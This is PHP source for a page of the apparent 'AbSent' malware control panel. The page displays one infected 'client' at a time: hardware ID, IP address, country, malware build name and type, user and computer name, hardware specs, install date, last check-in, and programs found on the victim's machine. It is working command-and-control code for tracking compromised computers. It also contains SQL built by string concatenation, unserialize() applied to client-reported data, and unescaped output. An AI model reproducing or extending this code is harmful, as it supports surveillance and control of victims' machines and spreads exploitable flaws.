<?php
include '../include/session.php';
include '../include/geo.php';
include '../include/stats.php';
$userperms = $odb->query("SELECT permissions FROM users WHERE username = '".$username."'")->fetchColumn(0);

$details = $odb->prepare("SELECT * FROM clients WHERE id = :id");
$details->execute(array(":id" => $_GET['id']));
$details = $details->fetch(PDO::FETCH_ASSOC);

?>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>AbSent Dash</title>
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- inject:css -->
    <link rel="stylesheet" href="../css/lib/getmdl-select.min.css">
    <link rel="stylesheet" href="../css/lib/nv.d3.css">
    <link rel="stylesheet" href="../css/application.css">
    <!-- endinject -->
</head>
<body>
<div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header is-small-screen">
    <header class="mdl-layout__header">
        <div class="mdl-layout__header-row">
            <div class="mdl-layout-spacer"></div>

            <div class="avatar-dropdown" id="icon">
            <span><?php echo $username; ?></span>
                <img src="../images/avatar.png">
            </div>

            <!-- Account dropdawn-->
            <ul class="mdl-menu mdl-list mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect mdl-shadow--2dp account-dropdown"
                for="icon">
                <li class="mdl-list__item mdl-list__item--two-line">
                    <span class="mdl-list__item-primary-content">
                    <span><?php echo $username; ?></span>
                    <span class="mdl-list__item-sub-title"><?php echo $userperms; ?></span>
                    </span>
                </li>
                <li class="list__item--border-top"></li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="account.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">account_circle</i>
                        My account
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="settings.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">settings</i>
                       Settings
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="logout.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">exit_to_app</i>
                        Logout
                    </a>
                </li>
                
        </div>
    </header>

    <div class="mdl-layout__drawer">
        <header>AbSent</header>
        <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="index.php">
                <i class="material-icons" role="presentation">dashboard</i>
                Dashboard
            </a>
            <a class="mdl-navigation__link mdl-navigation__link--current" href="clients.php">
                <i class="material-icons" role="presentation">person</i>
                Clients
            </a>
            <a class="mdl-navigation__link" href="tasks.php">
                <i class="material-icons" role="presentation">map</i>
                Tasks
            </a>
        </nav>
    </div>
    <main class="mdl-layout__content">
    <div class="mdl-grid">
            <div class="mdl-cell mdl-cell--6-col">
                <div class="mdl-card mdl-shadow--2dp">
                    <div class="mdl-card__title">
                        <h2 class="mdl-card__title-text">Client: <?php echo $details['id']; ?></h2>
                    </div>
                    <div class="mdl-card__supporting-text no-padding">
                        <table class="mdl-data-table mdl-js-data-table full-width">
                            <thead>
                                <tr>
                                <th class="mdl-data-table__cell--non-numeric">Key</th>
                                <th class="mdl-data-table__cell--non-numeric">Value</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                echo '
                                    <tr><td class="mdl-data-table__cell--non-numeric">Hardware Id</td><td class="mdl-data-table__cell--non-numeric">'.$details['hwid'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">IP Address</td><td class="mdl-data-table__cell--non-numeric">'.$details['ipAddr'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Country</td><td class="mdl-data-table__cell--non-numeric">'.countryCodeToCountry($details['country']).'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Build Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['buildName'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Build Type</td><td class="mdl-data-table__cell--non-numeric">'.$details['buildType'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">User Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['userName'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Computer Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['computerName'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Operating System</td><td class="mdl-data-table__cell--non-numeric">'.$details['operatingSystem'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpu'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Architecture</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpuArchitecture'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Cores</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpuCores'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Ram</td><td class="mdl-data-table__cell--non-numeric">'.$details['ram'].'Mb</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Gpu Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['gpu'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Vram</td><td class="mdl-data-table__cell--non-numeric">'.$details['vram'].'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Install Date</td><td class="mdl-data-table__cell--non-numeric">'.timeAgo($details['installDate']).'</td></tr>
                                    <tr><td class="mdl-data-table__cell--non-numeric">Last Seen</td><td class="mdl-data-table__cell--non-numeric">'.timeAgo($details['lastKnock']).'</td></tr>
                                    
                                ';
                                ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <?php
            $foundPrograms = unserialize($details['foundPrograms']);           
            ?>
            <div class="mdl-cell mdl-cell--6-col">
                <div class="mdl-card mdl-shadow--2dp">
                    <div class="mdl-card__title">
                        <h2 class="mdl-card__title-text">Found Programs</h2>
                    </div>
                    <div class="mdl-card__supporting-text no-padding">
                        <table class="mdl-data-table mdl-js-data-table full-width">
                            <thead>
                                <tr>
                                <th class="mdl-data-table__cell--non-numeric">Key</th>
                                <th width="50%">Value</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                $c = 1;
                                foreach ($foundPrograms as $program)
                                {
                                    echo "<tr><td class=\"mdl-data-table__cell--non-numeric\">".$c."</td><td>".$program."</td></tr>";
                                    $c += 1;
                                }
                                ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
                            </div>
    </main>
</div>

<!-- inject:js -->
<script src="../js/d3.js"></script>
<script src="../js/getmdl-select.min.js"></script>
<script src="../js/material.js"></script>
<script src="../js/nv.d3.js"></script>
<!-- endinject -->

</body>
</html>
